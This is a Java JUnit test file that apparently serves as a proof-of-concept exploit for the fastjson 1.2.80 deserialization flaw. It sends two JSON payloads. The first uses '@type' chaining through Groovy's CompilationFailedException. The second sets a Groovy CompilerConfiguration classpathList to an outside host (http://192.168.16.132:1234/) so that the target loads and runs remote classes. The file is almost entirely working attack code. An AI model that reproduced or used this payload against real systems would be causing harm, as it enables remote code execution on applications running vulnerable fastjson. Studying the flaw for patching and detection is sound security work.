package com.example.fastjson_1_2_80;

import com.alibaba.fastjson.JSON;
import org.junit.jupiter.api.Test;

/**
 * @author Whoopsunix
 */

public class fastjson_1_2_80 {
    @Test
    public void groovy(){
        String payload1 = "{\n" +
                "    \"@type\":\"java.lang.Exception\",\n" +
                "    \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
                "    \"unit\":{}\n" +
                "}";
        String payload2 = "{\n" +
                "    \"@type\":\"org.codehaus.groovy.control.ProcessingUnit\",\n" +
                "    \"@type\":\"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\",\n" +
                "    \"config\":{\n" +
                "        \"@type\":\"org.codehaus.groovy.control.CompilerConfiguration\",\n" +
                "        \"classpathList\":\"http://192.168.16.132:1234/\"\n" +
                "    }\n" +
                "}";

        try {
            JSON.parse(payload1);
        } catch (Exception e) {
        }
        System.out.println(JSON.parse(payload2));
    }


}
